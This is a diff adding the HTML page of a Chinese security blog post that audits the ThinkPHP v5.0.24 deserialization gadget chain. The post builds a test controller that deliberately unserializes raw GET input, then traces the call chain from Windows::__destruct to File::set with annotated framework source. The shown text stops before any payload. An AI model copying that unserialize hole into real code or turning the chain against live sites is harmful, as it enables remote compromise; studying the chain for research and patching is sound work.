@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ThinkPHP v5.0.24反序列化代码审计 | P4tt0n's B10g</title><meta name="author" content="P4tt0n"><meta name="copyright" content="P4tt0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ThinkPHP v5.0.24环境搭建thinkphp_5.0.24: 官网下载的thinkphp_5.0.24版本，有需要可以自取 (gitee.com) 从gitee下载的源码记得composer update 写一个入口函数 thinkphp_5.0.24&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP v5.0.24反序列化代码审计">
+<meta property="og:url" content="https://p4tt0n.github.io/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="P4tt0n&#39;s B10g">
+<meta property="og:description" content="ThinkPHP v5.0.24环境搭建thinkphp_5.0.24: 官网下载的thinkphp_5.0.24版本，有需要可以自取 (gitee.com) 从gitee下载的源码记得composer update 写一个入口函数 thinkphp_5.0.24&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php &lt;?php">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg">
+<meta property="article:published_time" content="2024-10-09T14:22:19.000Z">
+<meta property="article:modified_time" content="2024-10-09T14:23:00.795Z">
+<meta property="article:author" content="P4tt0n">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg"><link rel="shortcut icon" href="https://pic.imge.cc/2024/08/01/66ab32dd0cc03.png"><link rel="canonical" href="https://p4tt0n.github.io/2024/10/09/ThinkPHP-v5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.14.0-b3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.35/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>(()=>{
+      const saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+      
+      window.btf = {
+        saveToLocal: saveToLocal,
+        getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+          script.src = url
+          script.async = true
+          script.onerror = reject
+          script.onload = script.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            script.onload = script.onreadystatechange = null
+            resolve()
+          }
+
+          Object.keys(attr).forEach(key => {
+            script.setAttribute(key, attr[key])
+          })
+
+          document.head.appendChild(script)
+        }),
+
+        getCSS: (url, id = false) => new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+          link.rel = 'stylesheet'
+          link.href = url
+          if (id) link.id = id
+          link.onerror = reject
+          link.onload = link.onreadystatechange = function() {
+            const loadState = this.readyState
+            if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+            link.onload = link.onreadystatechange = null
+            resolve()
+          }
+          document.head.appendChild(link)
+        }),
+
+        addGlobalFn: (key, fn, name = false, parent = window) => {
+          const pjaxEnable = false
+          if (!pjaxEnable && key.startsWith('pjax')) return
+
+          const globalFn = parent.globalFn || {}
+          const keyObj = globalFn[key] || {}
+    
+          if (name && keyObj[name]) return
+    
+          name = name || Object.keys(keyObj).length
+          keyObj[name] = fn
+          globalFn[key] = keyObj
+          parent.globalFn = globalFn
+        }
+      }
+    
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+      
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })()</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ThinkPHP v5.0.24反序列化代码审计',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-09 22:23:00'
+}</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="./themes/butterfly/source/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', () => { preloader.initLoading() }, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', () => { preloader.endLoading() }, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic2.zhimg.com/32098d0cc61d44d6151fb7614211d256_r.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="P4tt0n's B10g"><img class="site-icon" src="https://pic.imge.cc/2024/07/30/66a8f95578d49.jpg" alt="Logo"/><span class="site-name">P4tt0n's B10g</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ThinkPHP v5.0.24反序列化代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-09T14:22:19.000Z" title="发表于 2024-10-09 22:22:19">2024-10-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-09T14:23:00.795Z" title="更新于 2024-10-09 22:23:00">2024-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ThinkPHP v5.0.24反序列化代码审计"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ThinkPHP-v5-0-24"><a href="#ThinkPHP-v5-0-24" class="headerlink" title="ThinkPHP v5.0.24"></a>ThinkPHP v5.0.24</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://gitee.com/zhouzhenhan/thinkphp_5.0.24">thinkphp_5.0.24: 官网下载的thinkphp_5.0.24版本，有需要可以自取 (gitee.com)</a></p>
+<p><strong>从gitee下载的源码记得composer update</strong></p>
+<p>写一个入口函数</p>
+<p>thinkphp_5.0.24&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$patton</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;patton&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">var_dump</span>(<span class="variable">$patton</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h3><p>反序列化链调用过程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">File.php:<span class="number">160</span>, think\cache\driver\File-&gt;<span class="title function_ invoke__">set</span>()</span><br><span class="line">Memcache.php:<span class="number">94</span>, think\session\driver\Memcache-&gt;<span class="title function_ invoke__">write</span>()</span><br><span class="line">Output.php:<span class="number">154</span>, think\console\Output-&gt;<span class="title function_ invoke__">write</span>()</span><br><span class="line">Output.php:<span class="number">143</span>, think\console\Output-&gt;<span class="title function_ invoke__">writeln</span>()</span><br><span class="line">Output.php:<span class="number">124</span>, think\console\Output-&gt;<span class="title function_ invoke__">block</span>()</span><br><span class="line">Output.php:<span class="number">212</span>, <span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line">Output.php:<span class="number">212</span>, think\console\Output-&gt;<span class="title function_ invoke__">__call</span>()</span><br><span class="line">Model.php:<span class="number">912</span>, think\console\Output-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br><span class="line">Model.php:<span class="number">912</span>, think\Model-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">Model.php:<span class="number">936</span>, think\Model-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">Model.php:<span class="number">2267</span>, think\Model-&gt;<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">Windows.php:<span class="number">163</span>, <span class="title function_ invoke__">file_exists</span>()</span><br><span class="line">Windows.php:<span class="number">163</span>, think\process\pipes\Windows-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">Windows.php:<span class="number">59</span>, think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">Index.php:<span class="number">14</span>, app\index\controller\Index-&gt;<span class="title function_ invoke__">hello</span>()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>前人栽树，后人乘凉，我们直接找到反序列化链的入口文件，从该类的<code>__destruct</code>方法开始寻找</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717204608970.png" alt="image-20240717204608970"></p>
+<p>然后跳转到removeFiles</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717204710297.png" alt="image-20240717204710297"></p>
+<p>执行file_exists()时$filename会被当做字符串，因此我们可以通过file_exists()函数触发__toString()函数</p>
+<p>全局搜搜function__toString</p>
+<p>选择Model.php</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717205720442.png" alt="image-20240717205720442"></p>
+<p>然后跟进toJson方法</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717205801657.png" alt="image-20240717205801657"></p>
+<p>接着跳转到toArray</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在912行看见$ value调用了一个getAttr()方法，如果 $value可控的话，我们就可以通过控制$value调用__call()方法。</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717210917875.png" alt="image-20240717210917875"></p>
+<p>发现902行$value是由getRelationData()的返回值进行赋值的，我们跟入getRelationData()函数</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717210943427.png" alt="image-20240717210943427"></p>
+<p>getRelationData函数</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123;</span><br><span class="line">           <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// 首先获取关联数据</span></span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">               <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getRelation</span>();</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们传入的参数为Relation类且满足if分支的条件，那$value就会由      $this-&gt;parent的值决定</p>
+<p>那么我们分析if的条件</p>
+<p>跟进isSelfRelation函数</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717211840752.png" alt="image-20240717211840752"></p>
+<p>可控</p>
+<p>跟进getModel函数</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717211927707.png" alt="image-20240717211927707"></p>
+<p>$query可控，因此此时我们需要查找哪个类的getModel()可控，在这里找到了thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Query.php类，跟进thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Query.php类</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717212121026.png" alt="image-20240717212121026"></p>
+<p>至此三个条件都可控，接下来我们需要判断是否能传入一个Relation类的参数</p>
+<p>回到刚刚，发现调用getRelationData()函数时传入的是$modelRelation变量</p>
+<p><img src="/2024/07/30/hello-world/0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240717225803495.png" alt="image-20240717225803495"></p>
+<p>跟进$relation()发现$relation()函数是根据$relation的值进行调用的并且要满足method_exists()函数，跟进parseName()</p>
